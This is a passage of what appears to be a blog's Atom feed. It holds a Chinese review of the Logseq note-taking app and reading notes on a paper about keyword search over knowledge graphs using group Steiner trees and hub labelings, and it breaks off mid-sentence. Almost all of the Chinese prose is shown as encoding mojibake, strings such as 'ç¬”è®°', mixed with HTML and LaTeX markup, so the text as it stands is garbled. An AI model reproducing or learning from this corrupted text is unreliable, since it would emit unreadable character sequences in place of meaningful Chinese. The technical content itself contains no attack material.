Typoraï¼ˆç¼–è¾‘ï¼‰+ Hexoï¼ˆç”Ÿæˆé™æ€åšå®¢ç½‘é¡µï¼‰+ GitHub Pagesï¼ˆå‘å¸ƒä¸æ£€ç´¢ï¼‰ã€‚ç„¶è€Œï¼Œç¬”è®°çš„<strong>ç§å¯†æ€§</strong>å’Œåšå®¢çš„<strong>å¼€æ”¾æ€§</strong>çš„çŸ›ç›¾æ— æ³•å¾—åˆ°æœ‰æ•ˆè§£å†³ï¼Œè¿™ä½¿æˆ‘é™·å…¥äº†ä¸¤éš¾çš„å¢ƒåœ°ã€‚</p><h2 id="å¹•å¸ƒ">å¹•å¸ƒ</h2><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/mubu.png" alt="å¹•å¸ƒ" /><figcaption>å¹•å¸ƒ</figcaption></figure><p>20 å¹´ï¼Œå‡†å¤‡è€ƒç ”å¤è¯•çš„ä¸“ä¸šè¯¾æ—¶ï¼Œæˆ‘å¼€å§‹å°è¯•å¹•å¸ƒè¿™ä¸ªåœ¨çº¿ç¬”è®°è½¯ä»¶ã€‚å¯¹äºæ•´ç†æ¦‚å¿µæ€§çš„çŸ¥è¯†ï¼Œå¹•å¸ƒç»å¯¹æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·ã€‚å°†ä¸€é—¨è¯¾ï¼Œä¸€æœ¬ä¹¦åŒ–ä¸ºä¸€ä¸ªä¸ªçŸ¥è¯†ç‚¹ï¼Œå¹¶é€šè¿‡å±‚æ¬¡è¡¨è¾¾å®ƒä»¬çš„å…³ç³»ï¼Œæœ€åè¿˜èƒ½ç”Ÿæˆç›¸åº”çš„æ€ç»´å¯¼å›¾ï¼Œè¿™ä¸ªç¬”è®°ä½“éªŒçœŸçš„æ˜¯å¤ªç¾å¦™äº†ã€‚</p><p>ç¾ä¸­ä¸è¶³çš„æ˜¯ï¼Œå¹•å¸ƒå¹¶<strong>ä¸æ”¯æŒå…¬å¼å’Œä»£ç å—çš„æ¸²æŸ“</strong>ï¼Œè¿™å¯¹äºæœ‰å¤§é‡å…¬å¼ä»£ç ç¬”è®°éœ€æ±‚çš„æˆ‘æ¥è¯´æœ‰ç‚¹é—æ†¾ã€‚</p><h2 id="logseq">Logseq</h2><p>æœ€è¿‘ï¼Œåœ¨ GitHub ä¸Šå‘ç°äº†ä¸€æ¬¾å¼€æºç¬”è®°åº”ç”¨ï¼Œ<a href="https://github.com/logseq/logseq" target="_blank" rel="noopener">Logseq</a>ï¼Œä¸ªäººæ„Ÿè§‰æ¯”è¾ƒå®Œç¾çš„æ»¡è¶³äº†æˆ‘çš„å‡ ç‚¹éœ€æ±‚ï¼š</p><ol type="1"><li>æ”¯æŒ Markdownï¼Œå¹¶ä¸”æ‰€è§å³æ‰€å¾— ï¼›</li><li>æ”¯æŒå…¬å¼å’Œä»£ç å—æ¸²æŸ“ï¼›</li><li>ä¿æŒç¬”è®°çš„ç§å¯†æ€§ã€‚</li></ol><p>ä¸‹ä¸€éƒ¨åˆ†ï¼Œæˆ‘å°†èŠä¸€èŠæˆ‘å¯¹ Logseq çš„ä½¿ç”¨ä½“éªŒã€‚</p><h1 id="logseq-åˆä½“éªŒ">Logseq åˆä½“éªŒ</h1><h2 id="å¿«é€Ÿä¸Šæ‰‹">å¿«é€Ÿä¸Šæ‰‹</h2><p>ä½¿ç”¨ Logseq éå¸¸ç®€å•ï¼Œåªéœ€è¦ä½ æ‹¥æœ‰ä¸€ä¸ªæµè§ˆå™¨ï¼Œä¸€ä¸ª GitHub è´¦æˆ·åŠç¬”è®°ä»“åº“ã€‚</p><div class="note info"><p>å¦‚æœè¦ä¿æŒä½ ç¬”è®°çš„ç§å¯†æ€§ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª<strong>ç§æœ‰</strong>çš„ GitHub ç¬”è®°ä»“åº“ä¾› Logseq å­˜å‚¨æ•°æ®æ–‡ä»¶ã€‚</p></div><p>å½“ä½ ï¼Œå‡†å¤‡å¥½ä¸Šè¿°è¦æ±‚ï¼Œåªéœ€è®¿é—® <a href="https://logseq.com/" target="_blank" rel="noopener">https://logseq.com/</a> ï¼Œå¹¶ä½¿ç”¨ Github ç™»å½•æˆæƒï¼Œè®¾ç½®å¥½ç¬”è®°ä»“åº“ï¼Œå°±å¯ä»¥å¼€å§‹ä½ çš„ç¬”è®°äº†ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/daily-notes.PNG" alt="Logseqé»˜è®¤ç•Œé¢" /><figcaption>Logseqé»˜è®¤ç•Œé¢</figcaption></figure><p>ç™»é™†åï¼ŒLogseq ä¼šé»˜è®¤åˆ›å»ºä¸€ä¸ªæ ‡é¢˜ä¸ºä»Šå¤©çš„æ–‡ä»¶ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨æ­¤å¼€å§‹ç¬”è®°ã€‚å¦‚æœè¦åˆ›å»ºæ–°çš„é¡µé¢ï¼Œä½ å¯ä»¥åœ¨å·¦ä¸Šçš„æœç´¢æ¡†è¾“å…¥æ–°é¡µé¢çš„æ–‡ä»¶åï¼Œå¹¶é€‰æ‹©ç›¸åº”çš„ä¸‹æ‹‰é€‰é¡¹ï¼Œå®Œæˆåˆ›å»ºã€‚</p><h2 id="ä½“éªŒæ„Ÿå—">ä½“éªŒæ„Ÿå—</h2><p>ä»æˆ‘çš„ä½¿ç”¨ä½“éªŒæ¥è¯´ï¼ŒLogseq çš„æ‰‹æ„Ÿæ˜¯ååˆ†æƒŠè‰³çš„ã€‚ä¸»è¦æœ‰å¦‚ä¸‹å‡ ç‚¹ï¼š</p><ul><li><strong>å¿«é€Ÿç¬”è®°</strong><ul><li>ååˆ†ç±»ä¼¼äºå¹•å¸ƒçš„é«˜æ•ˆçš„ç¬”è®°æ‰‹æ„Ÿ</li></ul></li><li><strong>æ•°æ®å®Œå…¨å±äºä½ </strong><ul><li>Logseq ä¸ä¿å­˜ä½ çš„ä»»ä½•æ•°æ®ã€‚å®ƒåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œä»…ä»…å°†ä½ çš„æ•°æ®ç¼“å­˜åœ¨æµè§ˆå™¨çš„æœ¬åœ°ç¼“å­˜ä¸­ï¼Œå¹¶ä¸ä½ è®¾å®šçš„ GitHub ä»“åº“åŒæ­¥ã€‚</li></ul></li><li><strong>å¼ºå¤§çš„é¡µé¢å¼•ç”¨ã€å—å¼•ç”¨</strong><ul><li>å— <a href="https://roamresearch.com/" target="_blank" rel="noopener">Roam</a> å¯å‘</li><li>è¿™å»ºç«‹äº†ç‹¬ç«‹çš„ç¬”è®°æ–‡ä»¶ä¹‹é—´çš„è”ç³»ï¼Œæ›´åˆ©äºç¬”è®°æ•´åˆæˆçŸ¥è¯†åº“ã€‚</li></ul></li><li><strong>æ”¯æŒ Markdownï¼Œå¹¶ä¸”æ‰€è§å³æ‰€å¾—</strong></li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/markdown-support.png" alt="Logseq ä¸­ Markdown æ”¯æŒæƒ…å†µ" /><figcaption>Logseq ä¸­ Markdown æ”¯æŒæƒ…å†µ</figcaption></figure><ul><li><strong>ä¸°å¯Œçš„å‘½ä»¤</strong><ul><li>é”®å…¥ <code>/</code> ï¼ˆslash é”®ï¼‰ï¼Œä½ ä¼šå‘ç°ä¸€ä¸ªå…¨æ–°çš„å¤§é™†ï¼šå¯ä»¥åˆ›å»ºå¾…åŠäº‹é¡¹ã€æ’å…¥é¡µé¢å¼•ç”¨æˆ–è€…å—å¼•ç”¨ï¼Œç”šè‡³è¿˜èƒ½åœ¨å…¶ä¸­æ’å…¥ä¸€ä¸ªç”»å›¾çš„é¡µé¢ã€‚</li></ul></li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/commands.PNG" alt="Logseq ä¸­çš„å‘½ä»¤" /><figcaption>Logseq ä¸­çš„å‘½ä»¤</figcaption></figure><h2 id="ä½¿ç”¨åœºæ™¯">ä½¿ç”¨åœºæ™¯</h2><p>åœ¨æˆ‘çœ‹æ¥ï¼ŒLogseq å…·æœ‰éå¸¸ä¸°å¯Œçš„ä½¿ç”¨åœºæ™¯ï¼š</p><ul><li><strong>è‡ªç”±å†™ä½œ</strong>ï¼šä½ å¯ä»¥åœ¨ Logseq å†™ä¸‹ä»»ä½•ä½ æ€æƒ³çš„ç«èŠ±ï¼Œä¾›æ—¥åæ•´ç†ã€‚</li><li><strong>å¾…åŠäº‹é¡¹</strong>ï¼šLogseq æä¾›äº†æ¯”è¾ƒä¸°å¯Œçš„å¾…åŠäº‹é¡¹åŠŸèƒ½ï¼ŒåŒ…æ‹¬åˆ›å»ºå¾…åŠäº‹é¡¹ï¼Œè®¾ç½®äº‹é¡¹ä¼˜å…ˆçº§ï¼Œè®¾å®š deadline å’Œ scheduleã€‚</li><li><strong>çŸ¥è¯†æ•´ç†</strong>ï¼šè¿™ä¹Ÿè®¸æ˜¯ Logseq æœ€æ ¸å¿ƒçš„ä½¿ç”¨æ–¹å¼ä¹‹ä¸€ã€‚</li><li>...ï¼ˆä¹Ÿè®¸è¿˜æœ‰æ›´å¤šï¼‰</li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/deadline-and-schedule.png" alt="Logseq çš„ deadline å’Œ schedule" /><figcaption>Logseq çš„ deadline å’Œ schedule</figcaption></figure><h1 id="ä»å†…è”åˆ°å¤–è”">ä»å†…è”åˆ°å¤–è”</h1><p>ä¼ ç»Ÿçš„ç¬”è®°è½¯ä»¶ï¼Œé€šå¸¸æŠŠç¬”è®°ç‹¬ç«‹ä¸ºä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶ï¼Œå…³æ³¨ä¸€ä¸ªæ–‡ä»¶å†…çš„å†…åœ¨è”ç³»ï¼Œè€Œå¿½è§†äº†ä¸åŒç¬”è®°ä¹‹é—´çš„è”ç³»ã€‚</p><p>Logseq å— Roam å¯å‘ï¼Œå°†ä¸åŒçš„ç¬”è®°æ–‡ä»¶é€šè¿‡<strong>é¡µé¢å¼•ç”¨</strong>è”ç³»èµ·æ¥ï¼Œä»è€Œæ›´å¥½åœ°æ„å»ºè‡ªå·±çš„çŸ¥è¯†ç½‘ç»œã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/KG.PNG" alt="Logseq å›¾è°±ç¤ºä¾‹" /><figcaption>Logseq å›¾è°±ç¤ºä¾‹</figcaption></figure><p>è¿‘æœŸï¼Œæ–°ç‰ˆçš„å¹•å¸ƒä¹Ÿä¸Šçº¿äº† <code>@æ–‡ä»¶å</code> å¼•ç”¨ä¸åŒçš„ç¬”è®°ï¼Œæƒ³å¿…ä¹Ÿæ˜¯å—åˆ°ç±»ä¼¼åº”ç”¨çš„å¯å‘ã€‚</p><p>ç”±æ­¤å¯è§ï¼Œç¬”è®°è½¯ä»¶æ­£åœ¨ä»å†…è”èµ°å‘å¤–è”ï¼Œè¶Šæ¥è¶Šç¬¦åˆå¯¹çŸ¥è¯†æ•´ç†çš„éœ€æ±‚ã€‚</p><h1 id="ä¸è¶³">ä¸è¶³</h1><p>ç›®å‰æ¥è¯´ï¼ŒLogseq è¿˜å­˜åœ¨è®¸å¤šä¸è¶³ï¼š</p><ul><li>Logseq è¿˜å¤„åœ¨å¿«é€Ÿè¿­ä»£é˜¶æ®µï¼Œå¾ˆå¤šåŠŸèƒ½å­˜åœ¨ä¸ç¨³å®šçš„å¯èƒ½ï¼›</li><li>ç›¸å…³çš„æ–‡æ¡£ç¨€å°‘ï¼Œå¯¹æ–°æ‰‹ä¸å¤ªå‹å¥½ï¼›</li></ul><p>ä½†æˆ‘ç›¸ä¿¡ï¼Œå¼€æºç¤¾åŒºçš„æ”¯æŒä¼šä½¿å¾—å®ƒæ›´åŠ å®Œå–„ã€‚</p>]]></content>
        <author>
            <name><![CDATA[CosmosNingçš„ä¸ªäººåšå®¢]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/</id>
        <title><![CDATA[Keyword Search over Knowledge Graphs via Static and Dynamic Hub Labelings é˜…è¯»ç¬”è®°]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/"><![CDATA[<h1 id="highlights">Highlights</h1><ul><li><strong>Static Hub Labelings</strong></li><li><strong>Dynamic Hub Labelings</strong></li></ul><h1 id="what">Whatï¼Ÿ</h1><h2 id="problem">Problem</h2><p>ä¸€ç§å¸¸è§çš„å›¾æ•°æ®ä¸Šçš„å…³é”®è¯æŸ¥è¯¢çš„æ–¹æ³•æ˜¯ï¼Œå°†æ¯ä¸€ä¸ªå…³é”®è¯ä¸å›¾ä¸Šçš„ä¸€ä¸ªé¡¶ç‚¹åŒ¹é…ï¼Œå¹¶ä¸”ä»ä¸­æŠ½å–å‡ºåŒ…å«è¿™äº›åŒ¹é…é¡¶ç‚¹çš„æœ€å°æƒé‡çš„æ ‘ï¼ˆè¿™ç§æ ‘è¢«ç§°ä¸º <em>minimum-weight Steiner trees</em>ï¼‰ã€‚æ›´è§„èŒƒåœ°è¯´ï¼Œç»™å®šä¸€ä¸ªæœ‰æƒè¾¹çš„æ•°æ®å›¾å’Œä¸€ä¸ªå…³é”®è¯æŸ¥è¯¢ï¼Œé¦–å…ˆå¯¹äºæ¯ä¸€ä¸ªå…³é”®è¯ï¼Œåœ¨å›¾ä¸­æ‰¾åˆ°ä¸ä¹‹åŒ¹é…çš„æ‰€æœ‰é¡¶ç‚¹ï¼Œå½¢æˆä¸€ä¸ªåŒ¹é…é›†ï¼›ç„¶åï¼Œåœ¨å›¾ä¸­æ‰¾åˆ°ä¸€ä¸ªæ‰©å±•åŒ¹é…é›†çš„æ ‘ï¼Œè¯¥æ ‘å¯¹äºæ¯ä¸€ä¸ªåŒ¹é…é›†ï¼Œè‡³å°‘åŒ…å«å…¶ä¸­çš„ä¸€ä¸ªé¡¶ç‚¹ï¼Œå¹¶ä¸”æ€»è¾¹æƒé‡æœ€å°ã€‚è¿™ä¸ªä¼˜åŒ–é—®é¢˜å«åš <em>group Steiner tree (GST) problem</em> ã€‚</p><div class="note info"><p>æ•°æ®å›¾ä¸­çš„è¾¹ä¹Ÿå¯ä»¥è¢«å…³é”®è¯åŒ¹é…ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ <em>graph subdivision</em> å°†è¾¹åŒ¹é…è½¬æ¢ä¸ºç‚¹åŒ¹é…ï¼Œä¹‹åä½¿ç”¨ç‚¹åŒ¹é…çš„æ–¹å¼å¤„ç†è¯¥åŒ¹é…å°±è¡Œäº†ã€‚</p></div><h2 id="contributions">Contributions</h2><ul><li>è®¾è®¡äº†ä¸€ä¸ªè´¨é‡æœ‰ä¿è¯çš„è¿‘ä¼¼ç®—æ³•ï¼Œèƒ½å¤Ÿåœ¨æ¯«ç§’çº§å†…ï¼Œä»ç™¾ä¸‡çº§å¤§å°çš„çŸ¥è¯†å›¾è°±ä¸­è¿”å›ä¸é”™çš„ç»“æœã€‚</li><li>è®¾è®¡äº†åŠ¨æ€ã€é™æ€ HLï¼Œæé«˜äº†æ€»ä½“çš„æ•ˆç‡ã€‚</li></ul><h1 id="why">Whyï¼Ÿ</h1><p>çŸ¥è¯†å›¾è°±è¶Šæ¥è¶Šå¤§ï¼Œç°å­˜çš„ç®—æ³•å¤ªæ…¢äº†ã€‚</p><h1 id="how">Howï¼Ÿ</h1><h2 id="problem-formulation">Problem Formulation</h2><ul><li><strong>çŸ¥è¯†å›¾è°±ï¼ˆ<em>KG</em>ï¼‰</strong>ï¼šè§„èŒƒçš„ï¼ŒçŸ¥è¯†å›¾è°±æ˜¯ä¸€ä¸ªç®€å•çš„æ— å‘å›¾ <span class="math inline">\(G=&lt;V,E&gt;\)</span> ï¼Œå…¶ä¸­ <span class="math inline">\(V\)</span> æ˜¯åŒ…å« <span class="math inline">\(n\)</span> ä¸ªé¡¶ç‚¹çš„æœ‰é™é›†åˆï¼Œç”¨æ¥æŒ‡ä»£å®ä½“ï¼ˆ<em>entity</em>ï¼‰ï¼Œè€Œ <span class="math inline">\(E\subseteq V\times V\)</span> æ˜¯é¡¶ç‚¹æ— åºå¯¹çš„æœ‰é™é›†åˆï¼Œä½œä¸ºå›¾çš„æ— å‘è¾¹ï¼Œç”¨æ¥ä»£è¡¨å®ä½“ä¹‹é—´çš„å…³ç³»ï¼ˆ<em>relation</em>ï¼‰ã€‚<ul><li><strong>è¾¹æƒé‡</strong>ï¼šå®šä¹‰ä¸€ä¸ªæƒé‡å‡½æ•° <span class="math inline">\(\textrm{wt}:E\mapsto \mathbb{R}^{0+}\)</span> ï¼ˆ<strong>å°æƒé‡è¡¨ç¤ºé‡è¦æ€§å¤§</strong>ï¼‰ã€‚</li></ul></li><li><strong>å›¾ä¸­æœ¯è¯­</strong><ul><li><span class="math inline">\(\textrm{len}(p)\)</span> ï¼šå¯¹äºä¸€æ¡è·¯å¾„ <span class="math inline">\(p\)</span> ï¼Œå®ƒçš„<strong>é•¿åº¦</strong>æ˜¯è·¯å¾„ä¸­æ‰€æœ‰è¾¹çš„æƒé‡ä¹‹å’Œã€‚</li><li><span class="math inline">\(\textrm{dist}(u,v)\)</span> ï¼šåœ¨å›¾ <span class="math inline">\(G\)</span> ä¸­ï¼Œè¿æ¥ <span class="math inline">\(u\)</span> ã€<span class="math inline">\(v\)</span> çš„<strong>æœ€çŸ­è·¯å¾„çš„é•¿åº¦</strong>ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œé‚£ä¹ˆä¸º <span class="math inline">\(\infty\)</span> ã€‚</li></ul></li><li><strong>å…³é”®è¯æ˜ å°„</strong>ï¼šå®šä¹‰ä¸€ä¸ªè·å–å‡½æ•° <span class="math inline">\(\textrm{hits}:\mathbb{K}\mapsto 2^V\)</span> ï¼Œå®ƒå°†å…³é”®è¯æ˜ å°„åˆ°é¡¶ç‚¹é›† <span class="math inline">\(V\)</span> çš„å­é›†ã€‚</li><li><strong>å…³é”®è¯æŸ¥è¯¢</strong>ï¼šä¸€ä¸ª<strong>å…³é”®è¯æŸ¥è¯¢</strong> <span class="math inline">\(Q\subseteq \mathbb{K}\)</span> æ˜¯ä¸€ä¸ªå…³é”®è¯çš„æœ‰é™é›†åˆã€‚<ul><li>ç»™å®šä¸€ä¸ªå«æœ‰ <span class="math inline">\(g\)</span> ä¸ªå…³é”®è¯çš„æŸ¥è¯¢ <span class="math inline">\(Q=\{k_1,k_2,\dots,\ k_g\}\)</span> ï¼Œå°† <span class="math inline">\(\textrm{hits}(k_i)\)</span> ç®€è®°ä¸º <span class="math inline">\(K_i\)</span> ï¼ˆ<span class="math inline">\(1\le i\le g\)</span>ï¼‰ï¼Œå¹¶ç§°ä¹‹ä¸º<strong>å…³é”®è¯é¡¶ç‚¹</strong>ã€‚</li><li>ç»™å®šä¸€ä¸ªå›¾ <span class="math inline">\(G=&lt;V,E&gt;\)</span> ï¼Œåœ¨ <span class="math inline">\(G\)</span> ä¸Šå…³äº <span class="math inline">\(Q\)</span> çš„ç»“æœæ˜¯ä¸€ä¸ª <em>group Steiner tree (GST)</em> ï¼Œè®°ä½œ <span class="math inline">\(T=&lt;V_T,E_T&gt;\)</span> ï¼Œæ»¡è¶³ä»¥ä¸‹æ¡ä»¶<ul><li><span class="math inline">\(V_T\subseteq V,E_T\subseteq E\)</span> ï¼Œå¹¶ä¸” <span class="math inline">\(T\)</span> æ˜¯ä¸€æ£µæ ‘ï¼›</li><li><span class="math inline">\(V_T\)</span> åŒ…å«æ¥è‡ªæ¯ä¸€ä¸ª <span class="math inline">\(K_i\)</span> ï¼ˆ<span class="math inline">\(1\le i\le g\)</span>ï¼‰ä¸­çš„è‡³å°‘ä¸€ä¸ªé¡¶ç‚¹ï¼Œä¹Ÿå°±æ˜¯ <span class="math inline">\(V_T\cap K_i \ne \emptyset\)</span> ï¼›</li><li>æ ‘çš„æƒé‡ï¼ˆå®šä¹‰ä¸º <span class="math inline">\(\textrm{WT}(T)=\sum_{e\in E_T}\textrm{wt}(e)\)</span>ï¼‰æœ€å°</li></ul></li></ul></li></ul><h2 id="overview-of-two-algorithm">Overview of Two Algorithm</h2><p>ç¬¬ä¸€ä¸ªç®—æ³• <em>KeyKG</em> ä¸ºæ¯ä¸€ä¸ªå…³é”®è¯é€‰å–åŒ¹é…çš„é¡¶ç‚¹ï¼Œå¹¶ä¸”æ‰¾åˆ°å¯¹åº”çš„æ ‘ã€‚å¯¹äº <span class="math inline">\(g\)</span> ä¸ªå…³é”®è¯ï¼Œ<em>KeyKG</em> æ˜¯ä¸€ä¸ª <span class="math inline">\((g-1)\)</span> - è¿‘ä¼¼ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ª GST çš„è¾¹æƒå€¼çš„æ€»å’Œè‡³å¤šæ˜¯æœ€å°æƒé‡çš„ <span class="math inline">\((g-1)\)</span> å€ã€‚è·å¾—è¿™æ ·çš„è¿‘ä¼¼æ•ˆæœè¦å½’åŠŸäºåŒ¹é…é¡¶ç‚¹é›†çš„é€‰æ‹©å’Œåˆ©ç”¨æœ€çŸ­è·¯å¾„æ ‘çš„æ„é€ ã€‚ä¸ºäº†æ›´é«˜æ•ˆçš„åœ¨çº¿è®¡ç®—è·ç¦»å’Œæœ€çŸ­è·¯å¾„ï¼Œè¯¥æ–‡ç« è®¾è®¡äº†ä¸€ä¸ª HL ï¼Œè¿™ä¸ª HL ä½¿ç”¨äº†ä¸€ç§å…¨æ–°çš„åŸºäº <em>betweenness centrality</em> çš„å¯å‘å¼æ–¹æ³•æ”¹å–„äº†ç°å­˜çš„ <em>pruned landmark labeling</em> ã€‚ä¼ ç»Ÿçš„ï¼Œè¿™ç§ HL æ˜¯é™æ€çš„ï¼Œå› ä¸ºå®ƒæ˜¯ç¦»çº¿ç”Ÿæˆçš„ï¼Œå¹¶ä¸”å¯¹æŸ¥è¯¢æ˜¯ä¸å˜çš„ã€‚åœ¨å·¨å¤§çš„çŸ¥è¯†å›¾è°±ä¸­ï¼Œ ä½¿ç”¨é™æ€ HL çš„ <em>KeyKG</em> ç®—æ³•è‡³å°‘æ¯”ç›®å‰å…ˆè¿›çš„ç®—æ³•å¿«ä¸€ä¸ªæ•°é‡çº§ï¼Œå¹¶ä¸”æ‰€å¾—ç»“æœçš„è´¨é‡ä¹Ÿè¾ƒé«˜ã€‚</p><p>ç¬¬äºŒä¸ªç®—æ³• <em>KeyKG+</em> é€šè¿‡ä½¿ç”¨ä¸€ç§æ–°é¢–çš„ HL æ‰©å±•äº† <em>KeyKG</em> ç®—æ³•ã€‚è¿™é‡Œæ‰€æå‡ºçš„ HL æ˜¯åŠ¨æ€çš„ï¼Œå› ä¸ºå®ƒæ˜¯åœ¨å¤„ç†ä¸€ä¸ªå…·ä½“çš„æŸ¥è¯¢æ—¶ï¼Œé€šè¿‡å€’æ’å’Œèšé›†æŸäº›æŸ¥è¯¢ç›¸å…³çš„é™æ€æ ‡ç­¾ï¼Œè€ŒåŠ¨æ€ç”Ÿæˆçš„ã€‚å®ƒå‡å°‘äº† KeyKG ç®—æ³•ä¸­çš„é‡å¤æ“ä½œï¼ˆè¿™äº›é‡å¤æ“ä½œæ˜¯æŒ‡ä½¿ç”¨ä¼ ç»Ÿé™æ€ HL è®¡ç®—é¡¶ç‚¹é›†çš„è·ç¦»ï¼‰ã€‚å°½ç®¡åœ¨çº¿ç”Ÿæˆä¼šèŠ±è´¹é¢å¤–çš„æ—¶é—´ï¼Œä½¿ç”¨åŠ¨æ€ HL ä¸ºæ€»ä½“æ•ˆç‡å¸¦æ¥äº†å‡ ä¸ªæ•°é‡çº§çš„æé«˜ã€‚</p><h2 id="keykg-with-static-hl">KeyKG With Static HL</h2><h3 id="algorithm-keykg">Algorithm KeyKG</h3><h4 id="algorithm-explained">Algorithm Explained</h4><p>å¦‚ä¸‹å›¾<strong>ç®—æ³• 1</strong> æ‰€ç¤ºï¼Œ<em>KeyKG</em> åœ¨çŸ¥è¯†å›¾è°±ä¸­æ‰¾åˆ°ä¸€ä¸ª <em>GST</em> ï¼Œè¿™ä¸ª <em>GST</em> æ˜¯ç”± <span class="math inline">\(g\)</span> ä¸ªå…³é”®è¯é›†åˆæ‰©å±•è€Œæ¥ã€‚ç®€è€Œè¨€ä¹‹ï¼Œ <em>KeyKG</em> é¦–å…ˆè´ªå©ªåœ°é€‰æ‹©ä¸€ç»„ç›¸äº’é è¿‘çš„ä¸€ç»„å…³é”®è¯é¡¶ç‚¹é›†åˆï¼ˆè®°ä½œ <span class="math inline">\(U_x\)</span>ï¼‰ï¼Œè¿™ç»„å…³é”®è¯é¡¶ç‚¹é›†åˆåŒ…å«äº†æ¥è‡ªæ¯ä¸€ä¸ª <span class="math inline">\(K_i\)</span> ï¼ˆ<span class="math inline">\(1\le i\le g\)</span>ï¼‰ä¸­çš„ä¸€ä¸ªé¡¶ç‚¹ï¼ˆ<strong>Line 1 - 8</strong>ï¼‰ã€‚ç„¶åï¼Œ<em>KeyKG</em> è´ªå©ªåœ°æ‰¾åˆ°ä¸€ä¸ªç”± <span class="math inline">\(U_x\)</span> æ‰©å±•è€Œæ¥çš„ <em>GST</em> ï¼ˆè®°ä½œ <span class="math inline">\(T_{u_{min}}\)</span>ï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡è¿­ä»£åœ°æ‰©å±•æœ€çŸ­è·¯å¾„è€Œå¾—åˆ°çš„ï¼ˆ<strong>Line 9 - 18</strong>ï¼‰ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo1.PNG" alt="ç®—æ³• 1" /><figcaption>ç®—æ³• 1</figcaption></figure><p>å…·ä½“çš„ï¼Œå¯¹äºæ¯ä¸€ä¸ª <span class="math inline">\(v_1 \in K_1\)</span> ï¼ˆ<strong>Line 1</strong>ï¼‰ï¼Œ<em>KeyKG</em> ä»æ¯ä¸€ä¸ª <span class="math inline">\(K_i\)</span> æ‰¾åˆ°ä¸€ä¸ªé¡¶ç‚¹ <span class="math inline">\(v_i\)</span> ï¼Œå®ƒè·ç¦» <span class="math inline">\(v_1\)</span> çš„è·ç¦»æœ€çŸ­ï¼ˆ<strong>Line 2 - 4</strong>ï¼‰ã€‚ä»¤ <span class="math inline">\(U_{v_1}\)</span> ä¸ºæ‰€æœ‰è¿™æ ·çš„é¡¶ç‚¹ <span class="math inline">\(v_i\)</span> ï¼ˆåŒ…æ‹¬ <span class="math inline">\(v_1\)</span>ï¼‰çš„çš„é›†åˆï¼Œå¹¶ä¸”ä»¤ <span class="math inline">\(W_{v_1}\)</span> ä¸ºå®ƒä»¬åˆ° <span class="math inline">\(v_1\)</span> çš„è·ç¦»ä¹‹å’Œï¼ˆ<strong>Line 5 - 6</strong>ï¼‰ã€‚ä»¤ <span class="math inline">\(x\in K_1\)</span> ä¸º <span class="math inline">\(K_1\)</span> ä¸­ <span class="math inline">\(W_{v_1}\)</span> æœ€å°çš„é¡¶ç‚¹ï¼ˆ<strong>Line 8</strong>ï¼‰ã€‚</p><div class="note info"><p><strong>æ‰©å±• <span class="math inline">\(U_x\)</span> æ‰€å¾—åˆ°çš„ GST å¯èƒ½æœ‰è¾ƒå°çš„æƒé‡</strong></p><ul><li>å› ä¸º <span class="math inline">\(U_x\)</span> åŒ…å«äº†æ¥è‡ªæ¯ä¸€ä¸ª <span class="math inline">\(K_i\)</span> ï¼ˆ<span class="math inline">\(1\le i\le g\)</span>ï¼‰ä¸­çš„ä¸€ä¸ªé¡¶ç‚¹ï¼Œå¹¶ä¸”è¿™äº›é¡¶ç‚¹ç›¸å¯¹è€Œè¨€ååˆ†æ¥è¿‘ï¼Œæ‰€ä»¥æ‰©å±• <span class="math inline">\(U_x\)</span> æ‰€å¾—åˆ°çš„ GST å¯èƒ½æœ‰è¾ƒå°çš„æƒé‡ã€‚</li></ul></div><p><strong>ç®—æ³• 1</strong> å‰©ä¸‹çš„éƒ¨åˆ†ä»¥æ¯ä¸€ä¸ª <span class="math inline">\(u\in U_x\)</span> æ„é€ ä¸€ä¸ª <em>GST</em> <span class="math inline">\(T_u\)</span> ï¼Œå¹¶ä¸”ä»è¿™ <span class="math inline">\(|U_x|\)</span> æ£µ <em>GST</em> ä¸­æ‰¾å‡ºæƒé‡æœ€å°çš„é‚£ä¸€ä¸ªã€‚å…·ä½“çš„ï¼Œæ¯ä¸€æ£µ <span class="math inline">\(T_u\)</span> è¢«åˆå§‹åŒ–ä¸ºåªå«æœ‰ä¸€ä¸ªå•ä¸€çš„é¡¶ç‚¹ <span class="math inline">\(u\)</span> ï¼ˆ<strong>Line 9 - 10</strong>ï¼‰ã€‚ç„¶åï¼Œä¸æ–­è¿­ä»£ç›´è‡³ <span class="math inline">\(T_u\)</span> æ‰©å±•äº† <span class="math inline">\(U_x\)</span> ä¸­çš„æ‰€æœ‰é¡¶ç‚¹ï¼ˆ<strong>Line 11</strong>ï¼‰ï¼šä» <span class="math inline">\(T_u\)</span> ä¸­é€‰å–ä¸€ä¸ªç‚¹ <span class="math inline">\(s_{\textrm{min}}\)</span> ï¼Œä» <span class="math inline">\(U_x-T_u\)</span> ä¸­é€‰ä¸€ä¸ªç‚¹ <span class="math inline">\(t_{\textrm{min}}\)</span> 